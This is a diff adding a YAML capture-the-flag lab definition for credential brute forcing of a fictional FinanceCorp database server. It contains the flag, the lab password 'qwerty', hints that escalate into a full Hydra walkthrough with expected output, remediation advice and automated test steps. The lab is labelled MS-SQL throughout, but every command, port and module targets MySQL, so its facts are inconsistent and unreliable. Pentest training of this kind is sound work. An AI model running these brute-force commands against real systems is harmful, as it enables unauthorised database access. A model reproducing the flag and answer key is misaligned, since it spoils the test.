@@ -1,0 +1,440 @@
+name: MS-SQL Credential Brute Force
+description: Perform automated brute force attacks against FinanceCorp's MS-SQL server to test password strength.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - brute force ms-sql credentials
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your credential testing against FinanceCorp's MS-SQL server has revealed potential 
+  authentication weaknesses. James Mitchell wants to understand if automated brute 
+  force attacks could compromise database access, as this represents a significant 
+  security risk.
+  
+  Brute force attacks systematically test many password combinations to discover weak 
+  credentials. FinanceCorp needs to know if their password policies are sufficient 
+  to resist such attacks on database servers.
+  
+  Your objective: Perform automated brute force attacks against FinanceCorp's MS-SQL 
+  server. Test password strength and identify if weak passwords can be discovered 
+  through systematic credential testing.
+
+flag: "OCR{mssql_brut3}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding Credential Brute Force Attacks
+
+      A **brute force attack** is a systematic method of discovering valid
+      credentials by trying many username/password combinations until a
+      successful login is found. This is one of the most fundamental
+      attack techniques in penetration testing.
+
+      ### Types of Password Attacks
+
+      | Attack Type       | Description                                  |
+      |-------------------|----------------------------------------------|
+      | **Brute Force**   | Try every possible combination               |
+      | **Dictionary**    | Try passwords from a wordlist                |
+      | **Hybrid**        | Dictionary words with modifications          |
+      | **Credential Stuffing** | Use leaked credentials from breaches   |
+      | **Password Spray** | One password against many usernames          |
+
+      ### Why Brute Force Works Against Databases
+
+      Database services are particularly vulnerable to brute force because:
+
+      - **No account lockout** by default in MySQL/MariaDB
+      - **No rate limiting** on authentication attempts
+      - **No CAPTCHA** or multi-factor authentication
+      - **Predictable usernames** (root, sa, admin, dba)
+      - **Weak password policies** are common in internal systems
+
+      ### The Risk to Organizations
+
+      When database credentials are brute-forced:
+
+      1. Attackers gain access to all stored data
+      2. Data exfiltration becomes possible
+      3. Data manipulation or deletion may occur
+      4. The database may be used as a pivot point for further attacks
+      5. Ransomware operators may encrypt database files
+
+      ### What You Will Learn
+
+      In this lab, you will use an automated tool to brute force the
+      password for the `sa` database account. The password is intentionally
+      weak to demonstrate why strong password policies are essential.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Introduction to Hydra
+
+      **Hydra** (THC-Hydra) is a fast, flexible, and widely-used network
+      login cracker. It supports numerous protocols including MySQL,
+      SSH, FTP, HTTP, SMB, and many more.
+
+      ### Installing Hydra
+
+      Hydra is pre-installed on Kali Linux. On other systems:
+
+      ```bash
+      sudo apt update
+      sudo apt install -y hydra
+      ```
+
+      ### Basic Hydra Syntax
+
+      ```bash
+      hydra [options] <target> <protocol>
+      ```
+
+      Or using the URL-style syntax:
+
+      ```bash
+      hydra [options] <protocol>://<target>
+      ```
+
+      ### Key Hydra Options
+
+      | Option       | Description                               |
+      |-------------|-------------------------------------------|
+      | `-l <user>` | Single username                           |
+      | `-L <file>` | Username list file                        |
+      | `-p <pass>` | Single password                           |
+      | `-P <file>` | Password list file                        |
+      | `-t <n>`    | Number of parallel tasks (threads)        |
+      | `-f`        | Stop after first valid pair found         |
+      | `-v`        | Verbose mode                              |
+      | `-V`        | Show each attempt (very verbose)          |
+      | `-s <port>` | Specify non-default port                  |
+      | `-o <file>` | Output results to file                    |
+
+      ### Supported Protocols for Databases
+
+      Hydra supports several database protocols:
+
+      - `mysql` - MySQL / MariaDB
+      - `mssql` - Microsoft SQL Server
+      - `postgres` - PostgreSQL
+      - `oracle-listener` - Oracle
+
+      For this lab, you will use the `mysql` protocol module.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Hydra MySQL Brute Force in Detail
+
+      ### MySQL Module Syntax
+
+      ```bash
+      hydra -l <username> -P <wordlist> mysql://<target>
+      ```
+
+      Or equivalently:
+
+      ```bash
+      hydra -l <username> -P <wordlist> <target> mysql
+      ```
+
+      ### Choosing a Wordlist
+
+      Kali Linux includes several useful wordlists:
+
+      | Wordlist Path                                    | Size    | Purpose          |
+      |--------------------------------------------------|---------|------------------|
+      | `/usr/share/wordlists/rockyou.txt`               | 14M     | General passwords|
+      | `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt` | Small | Top 100 |
+      | `/usr/share/seclists/Passwords/Common-Credentials/best1050.txt` | Small | Common 1050 |
+      | `/usr/share/wordlists/fasttrack.txt`             | Small   | Quick brute force|
+
+      **Note:** The `rockyou.txt` file may need to be decompressed first:
+
+      ```bash
+      sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+      ```
+
+      ### Important Considerations
+
+      - **Thread count:** MySQL can handle many concurrent connections,
+        but too many threads may cause instability. Start with `-t 4`.
+      - **Wordlist selection:** Start with smaller wordlists before
+        trying larger ones. The password in this lab is common and will
+        be found in most standard wordlists.
+      - **Stop on success:** Use `-f` to stop immediately when valid
+        credentials are found.
+
+      ### The Target Password
+
+      The `sa` account in this lab uses a weak, commonly-used password.
+      It will be found in most standard wordlists including `rockyou.txt`
+      and `fasttrack.txt`. The password is: `qwerty`
+
+      This is one of the top 10 most commonly used passwords worldwide.
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Workflow for This Lab
+
+      ### Step 1: Install Required Tools
+
+      Ensure Hydra and the MySQL client are available:
+
+      ```bash
+      sudo apt update
+      sudo apt install -y hydra default-mysql-client
+      ```
+
+      ### Step 2: Verify the Target Service
+
+      Confirm MySQL is running on the target:
+
+      ```bash
+      nmap -sV -p 3306 <target>
+      ```
+
+      ### Step 3: Prepare Your Wordlist
+
+      Check that a suitable wordlist exists:
+
+      ```bash
+      # Check for rockyou
+      ls -la /usr/share/wordlists/rockyou.txt
+
+      # If compressed, decompress it
+      sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+      # Or use fasttrack for a quicker attack
+      ls -la /usr/share/wordlists/fasttrack.txt
+      ```
+
+      If no wordlists are available, create a small one with common
+      passwords:
+
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      123456
+      admin
+      qwerty
+      letmein
+      welcome
+      monkey
+      master
+      dragon
+      login
+      EOF
+      ```
+
+      ### Step 4: Launch Hydra
+
+      Run the brute force attack:
+
+      ```bash
+      hydra -l sa -P /usr/share/wordlists/rockyou.txt mysql://<target> -t 4 -f -V
+      ```
+
+      ### Step 5: Verify Discovered Credentials
+
+      When Hydra finds the password, test it manually:
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -p<discovered_password> -h <target>
+      ```
+
+      ### Step 6: Retrieve the Flag
+
+      Once authenticated, read the flag:
+
+      ```sql
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      ```
+
+      ### Step 7: Document the Results
+
+      Note the discovered credentials and submit the flag.
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands for This Lab
+
+      ### Install Tools
+
+      ```bash
+      sudo apt install -y hydra default-mysql-client
+      ```
+
+      ### Run Hydra with rockyou.txt
+
+      ```bash
+      hydra -l sa -P /usr/share/wordlists/rockyou.txt mysql://<target> -t 4 -f
+      ```
+
+      ### Run Hydra with fasttrack.txt (Faster)
+
+      ```bash
+      hydra -l sa -P /usr/share/wordlists/fasttrack.txt mysql://<target> -t 4 -f
+      ```
+
+      ### Run Hydra with Custom Wordlist
+
+      If standard wordlists are not available:
+
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      123456
+      12345678
+      qwerty
+      abc123
+      monkey
+      master
+      dragon
+      111111
+      letmein
+      EOF
+
+      hydra -l sa -P /tmp/passwords.txt mysql://<target> -t 4 -f -V
+      ```
+
+      ### Verify Credentials After Discovery
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -pqwerty -h <target>
+      ```
+
+      ### Retrieve the Flag
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -pqwerty -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+      ### Troubleshooting
+
+      If Hydra fails to connect:
+      - Check that port 3306 is open: `nmap -p 3306 <target>`
+      - Ensure the `mysql` module is available: `hydra -U mysql`
+      - Try reducing threads: `-t 1`
+
+      If Hydra runs but does not find the password:
+      - Make sure your wordlist contains common passwords
+      - The password `qwerty` should be in any standard wordlist
+      - Try the custom wordlist above
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Step 1: Run the Brute Force Attack
+
+      ```bash
+      hydra -l sa -P /usr/share/wordlists/rockyou.txt mysql://<target> -t 4 -f
+      ```
+
+      **Expected Output:**
+      ```
+      Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
+
+      Hydra (https://github.com/vanhauser-thc/thc-hydra)
+      [DATA] max 4 tasks per 1 server, overall 4 tasks
+      [DATA] attacking mysql://<target>:3306/
+      [3306][mysql] host: <target>   login: sa   password: qwerty
+      [STATUS] attack finished for <target> (valid pair found)
+      1 of 1 target successfully completed, 1 valid password found
+      Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
+      ```
+
+      The discovered credentials are: `sa` / `qwerty`
+
+      ### Step 2: Verify the Credentials
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -pqwerty -h <target> -e "SELECT CURRENT_USER();"
+      ```
+
+      **Expected Output:**
+      ```
+      +----------------+
+      | CURRENT_USER() |
+      +----------------+
+      | sa@%           |
+      +----------------+
+      ```
+
+      ### Step 3: Retrieve the Flag
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -pqwerty -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+      **Expected Output:**
+      ```
+      +---------------------------------------------------+
+      | LOAD_FILE('/tmp/flag.txt')                         |
+      +---------------------------------------------------+
+      | OCR{...}                                         |
+      +---------------------------------------------------+
+      ```
+
+      ### Alternative: Using fasttrack.txt (Faster)
+
+      ```bash
+      hydra -l sa -P /usr/share/wordlists/fasttrack.txt mysql://<target> -t 4 -f
+      ```
+
+      This completes in seconds since `fasttrack.txt` is much smaller
+      and `qwerty` is near the top of most wordlists.
+
+      ### Key Takeaways
+
+      - **Hydra** is a powerful network login cracker supporting MySQL
+      - Weak passwords like `qwerty` are discovered in seconds
+      - MySQL has no default brute force protection (no lockout)
+      - The `-f` flag stops Hydra after the first valid credential
+      - Always verify discovered credentials manually before proceeding
+      - Strong passwords and account lockout policies prevent brute force
+      - Rate limiting and fail2ban can mitigate automated attacks
+
+      ### Remediation Recommendations
+
+      For the penetration test report:
+      - Enforce minimum password length of 12+ characters
+      - Require password complexity (upper, lower, numbers, symbols)
+      - Implement account lockout after 5 failed attempts
+      - Configure `max_connect_errors` in MySQL to block repeated failures
+      - Use `fail2ban` to block IPs with excessive failed logins
+      - Consider certificate-based authentication for database access
+
+      Submit the flag value to complete this lab.
+
+credentials:
+  - username: "sa"
+    password: "qwerty"
+    role: "sa"
+    description: "sa credentials"
+
+workbook: "wiki/range/winpt/CH06_MSSQL_Exploitation/04_MSSQL_Credential_Brute_Force/"
+
+test:
+  steps:
+    - name: "Verify MySQL port 3306 is open"
+      command: "nmap -Pn -p 3306 {target.target} | grep '3306/tcp'"
+      expect: "open"
+
+    - name: "Authenticate to MySQL with brute-forced credentials"
+      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e 'SELECT CURRENT_USER()' 2>&1"
+      expect: "sa@"
+
+    - name: "Read flag file via LOAD_FILE"
+      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e \"SELECT LOAD_FILE('/tmp/flag.txt')\" 2>&1"
+      expect: "OCR{"
